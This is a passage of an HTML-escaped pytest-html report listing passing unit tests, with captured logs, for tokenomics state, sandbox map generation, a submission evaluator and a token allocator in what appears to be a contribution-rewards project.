&#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_tier_availability&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_tier_availability - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,178 - TestTokenomicsState.test_tier_availability - INFO - Testing tier availability\n2025-12-18 09:23:56,178 - TestTokenomicsState.test_tier_availability - INFO - \u2705 Tier availability working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_tier_availability:test_framework.py:390 Testing tier availability\nINFO     TestTokenomicsState.test_tier_availability:test_framework.py:390 \u2705 Tier availability working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_initialization&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_tokenomics_initialization - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  tokenomics_total_supply: 90000000000000\n  tokenomics_current_epoch: pioneer\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,179 - TestTokenomicsState.test_tokenomics_initialization - INFO - Testing tokenomics state initialization\n2025-12-18 09:23:56,179 - TestTokenomicsState.test_tokenomics_initialization - INFO - \u2705 Tokenomics initialized - current epoch: pioneer, total supply: 90000000000000\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_tokenomics_initialization:test_framework.py:390 Testing tokenomics state initialization\nINFO     TestTokenomicsState.test_tokenomics_initialization:test_framework.py:390 \u2705 Tokenomics initialized - current epoch: pioneer, total supply: 90000000000000\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_real_data_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_real_data_validation&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_real_data_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\nWarning: Failed to load state: Expecting value: line 1 column 1 (char 0)\n\n======================================================================\nTEST RESULT: test_tokenomics_real_data_validation - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,179 - TestTokenomicsState.test_tokenomics_real_data_validation - INFO - Testing tokenomics real data validation\n2025-12-18 09:23:56,180 - TestTokenomicsState.test_tokenomics_real_data_validation - INFO - \u2705 Tokenomics real data validation completed\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_tokenomics_real_data_validation:test_framework.py:390 Testing tokenomics real data validation\nINFO     TestTokenomicsState.test_tokenomics_real_data_validation:test_framework.py:390 \u2705 Tokenomics real data validation completed\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_statistics&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_tokenomics_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_tokenomics_statistics - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,180 - TestTokenomicsState.test_tokenomics_statistics - INFO - Testing tokenomics statistics\n2025-12-18 09:23:56,180 - TestTokenomicsState.test_tokenomics_statistics - INFO - \u2705 Tokenomics statistics working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_tokenomics_statistics:test_framework.py:390 Testing tokenomics statistics\nINFO     TestTokenomicsState.test_tokenomics_statistics:test_framework.py:390 \u2705 Tokenomics statistics working\n\n&#34;}], &#34;tests/test_core_modules.py::TestSandboxMap::test_contributor_network&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestSandboxMap::test_contributor_network&#34;, &#34;duration&#34;: &#34;4 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestSandboxMap::test_contributor_network&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;4 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_contributor_network - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,182 - TestSandboxMap.test_contributor_network - INFO - Testing contributor network\n2025-12-18 09:23:56,183 - TestSandboxMap.test_contributor_network - INFO - \u2705 Contributor network working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSandboxMap.test_contributor_network:test_framework.py:390 Testing contributor network\nINFO     TestSandboxMap.test_contributor_network:test_framework.py:390 \u2705 Contributor network working\n\n&#34;}], &#34;tests/test_core_modules.py::TestSandboxMap::test_export_map_for_visualization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestSandboxMap::test_export_map_for_visualization&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestSandboxMap::test_export_map_for_visualization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_export_map_for_visualization - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,185 - TestSandboxMap.test_export_map_for_visualization - INFO - Testing map export for visualization\n2025-12-18 09:23:56,187 - TestSandboxMap.test_export_map_for_visualization - INFO - \u2705 Map export for visualization working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSandboxMap.test_export_map_for_visualization:test_framework.py:390 Testing map export for visualization\nINFO     TestSandboxMap.test_export_map_for_visualization:test_framework.py:390 \u2705 Map export for visualization working\n\n&#34;}], &#34;tests/test_core_modules.py::TestSandboxMap::test_generate_map_with_filters&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestSandboxMap::test_generate_map_with_filters&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestSandboxMap::test_generate_map_with_filters&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_generate_map_with_filters - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,188 - TestSandboxMap.test_generate_map_with_filters - INFO - Testing sandbox map generation with filters\n2025-12-18 09:23:56,188 - TestSandboxMap.test_generate_map_with_filters - INFO - \u2705 Filtered map generation working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSandboxMap.test_generate_map_with_filters:test_framework.py:390 Testing sandbox map generation with filters\nINFO     TestSandboxMap.test_generate_map_with_filters:test_framework.py:390 \u2705 Filtered map generation working\n\n&#34;}], &#34;tests/test_core_modules.py::TestSandboxMap::test_metal_distribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestSandboxMap::test_metal_distribution&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestSandboxMap::test_metal_distribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_metal_distribution - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,190 - TestSandboxMap.test_metal_distribution - INFO - Testing metal distribution\n2025-12-18 09:23:56,190 - TestSandboxMap.test_metal_distribution - INFO - \u2705 Metal distribution working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSandboxMap.test_metal_distribution:test_framework.py:390 Testing metal distribution\nINFO     TestSandboxMap.test_metal_distribution:test_framework.py:390 \u2705 Metal distribution working\n\n&#34;}], &#34;tests/test_core_modules.py::TestSandboxMap::test_redundancy_report&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestSandboxMap::test_redundancy_report&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestSandboxMap::test_redundancy_report&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_redundancy_report - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,191 - TestSandboxMap.test_redundancy_report - INFO - Testing redundancy report\n2025-12-18 09:23:56,192 - TestSandboxMap.test_redundancy_report - INFO - \u2705 Redundancy report working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSandboxMap.test_redundancy_report:test_framework.py:390 Testing redundancy report\nINFO     TestSandboxMap.test_redundancy_report:test_framework.py:390 \u2705 Redundancy report working\n\n&#34;}], &#34;tests/test_core_modules.py::TestSandboxMap::test_sandbox_map_generation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestSandboxMap::test_sandbox_map_generation&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestSandboxMap::test_sandbox_map_generation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_sandbox_map_generation - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  nodes_count: 19\n  edges_count: 19\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,193 - TestSandboxMap.test_sandbox_map_generation - INFO - Testing sandbox map generation\n2025-12-18 09:23:56,193 - TestSandboxMap.test_sandbox_map_generation - INFO - \u2705 Sandbox map generated: 19 nodes, 19 edges\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSandboxMap.test_sandbox_map_generation:test_framework.py:390 Testing sandbox map generation\nINFO     TestSandboxMap.test_sandbox_map_generation:test_framework.py:390 \u2705 Sandbox map generated: 19 nodes, 19 edges\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluate_submission_method&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluate_submission_method&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCEvaluator::test_evaluate_submission_method&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluate_submission_method - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  submission_evaluation_status: acceptable\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,194 - TestPoCEvaluator.test_evaluate_submission_method - INFO - Testing evaluate_submission method\n2025-12-18 09:23:56,194 - TestPoCEvaluator.test_evaluate_submission_method - INFO - \u2705 Submission evaluated: status acceptable, score 0.4\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCEvaluator.test_evaluate_submission_method:test_framework.py:390 Testing evaluate_submission method\nINFO     TestPoCEvaluator.test_evaluate_submission_method:test_framework.py:390 \u2705 Submission evaluated: status acceptable, score 0.4\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluation_scoring&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluation_scoring&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCEvaluator::test_evaluation_scoring&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluation_scoring - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  evaluation_status: needs_improvement\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,195 - TestPoCEvaluator.test_evaluation_scoring - INFO - Testing evaluation scoring\n2025-12-18 09:23:56,195 - TestPoCEvaluator.test_evaluation_scoring - INFO - \u2705 Evaluation successful, status: needs_improvement\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCEvaluator.test_evaluation_scoring:test_framework.py:390 Testing evaluation scoring\nINFO     TestPoCEvaluator.test_evaluation_scoring:test_framework.py:390 \u2705 Evaluation successful, status: needs_improvement\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_edge_cases&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluator_edge_cases - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  long_content_handled: True\n  unicode_content_handled: True\n  minimal_content_handled: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,196 - TestPoCEvaluator.test_evaluator_edge_cases - INFO - Testing evaluator edge cases\n2025-12-18 09:23:56,196 - TestPoCEvaluator.test_evaluator_edge_cases - INFO - \u2705 Long content handled correctly\n2025-12-18 09:23:56,196 - TestPoCEvaluator.test_evaluator_edge_cases - INFO - \u2705 Unicode content handled correctly\n2025-12-18 09:23:56,196 - TestPoCEvaluator.test_evaluator_edge_cases - INFO - \u2705 Minimal content handled correctly\n2025-12-18 09:23:56,196 - TestPoCEvaluator.test_evaluator_edge_cases - INFO - \u2705 Evaluator edge cases tested\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCEvaluator.test_evaluator_edge_cases:test_framework.py:390 Testing evaluator edge cases\nINFO     TestPoCEvaluator.test_evaluator_edge_cases:test_framework.py:390 \u2705 Long content handled correctly\nINFO     TestPoCEvaluator.test_evaluator_edge_cases:test_framework.py:390 \u2705 Unicode content handled correctly\nINFO     TestPoCEvaluator.test_evaluator_edge_cases:test_framework.py:390 \u2705 Minimal content handled correctly\nINFO     TestPoCEvaluator.test_evaluator_edge_cases:test_framework.py:390 \u2705 Evaluator edge cases tested\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_error_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_error_handling&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_error_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluator_error_handling - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_error_handling - INFO - Testing evaluator error handling\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_error_handling - INFO - \u2705 Invalid RAG URL handled: ValueError\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_error_handling - INFO - \u2705 None input handled: AttributeError\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_error_handling - INFO - \u2705 Incomplete submission handled: RuntimeError\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_error_handling - INFO - \u2705 Evaluator error handling tested\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCEvaluator.test_evaluator_error_handling:test_framework.py:390 Testing evaluator error handling\nINFO     TestPoCEvaluator.test_evaluator_error_handling:test_framework.py:390 \u2705 Invalid RAG URL handled: ValueError\nINFO     TestPoCEvaluator.test_evaluator_error_handling:test_framework.py:390 \u2705 None input handled: AttributeError\nERROR    layer2.evaluator.pod_evaluator.PODEvaluator:pod_evaluator.py:120 Evaluation failed for submission unknown: Invalid submission: [&amp;#x27;Missing required field: description&amp;#x27;, &amp;#x27;Missing required field: category&amp;#x27;]\nINFO     TestPoCEvaluator.test_evaluator_error_handling:test_framework.py:390 \u2705 Incomplete submission handled: RuntimeError\nINFO     TestPoCEvaluator.test_evaluator_error_handling:test_framework.py:390 \u2705 Evaluator error handling tested\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_initialization&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCEvaluator::test_evaluator_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_evaluator_initialization - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_initialization - INFO - Testing evaluator initialization\n2025-12-18 09:23:56,197 - TestPoCEvaluator.test_evaluator_initialization - INFO - \u2705 PoC evaluator initialized\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCEvaluator.test_evaluator_initialization:test_framework.py:390 Testing evaluator initialization\nINFO     TestPoCEvaluator.test_evaluator_initialization:test_framework.py:390 \u2705 PoC evaluator initialized\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_allocator_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_allocator_edge_cases&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_allocator_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_allocator_edge_cases - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - Testing token allocator edge cases\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Invalid tier raised exception: AttributeError\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Invalid epoch raised exception: AttributeError\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Edge case (, pioneer) raised exception: AttributeError\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Edge case (gold, ) raised exception: AttributeError\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Edge case (None, pioneer) raised exception: AttributeError\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Edge case (gold, None) raised exception: AttributeError\n2025-12-18 09:23:56,198 - TestTokenAllocator.test_allocator_edge_cases - INFO - \u2705 Token allocator edge cases tested\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 Testing token allocator edge cases\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Invalid tier raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Invalid epoch raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Edge case (, pioneer) raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Edge case (gold, ) raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Edge case (None, pioneer) raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Edge case (gold, None) raised exception: AttributeError\nINFO     TestTokenAllocator.test_allocator_edge_cases:test_framework.py:390 \u2705 Token allocator edge cases tested\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_allocator_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_allocator_initialization&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_allocator_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_allocator_initialization - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,199 - TestTokenAllocator.test_allocator_initialization - INFO - Testing token allocator initialization\n2025-12-18 09:23:56,199 - TestTokenAllocator.test_allocator_initialization - INFO - \u2705 Token allocator initialized\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenAllocator.test_allocator_initialization:test_framework.py:390 Testing token allocator initialization\nINFO     TestTokenAllocator.test_allocator_initialization:test_framework.py:390 \u2705 Token allocator initialized\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenAllocator::test_allocator_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenAllocator::test_allocator_validation&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenAllocator::test_allocator_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_allocator_validation - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_allocator_validation - INFO - Testing token allocator input validation\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_allocator_validation - INFO - \u2705 Malformed input int raised exception: AttributeError\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_allocator_validation - INFO - \u2705 Malformed input list raised exception: AttributeError\n2025-12-18 09:23:56,200 - TestTokenAllocator.test_allocator_validation - INFO - \u2705 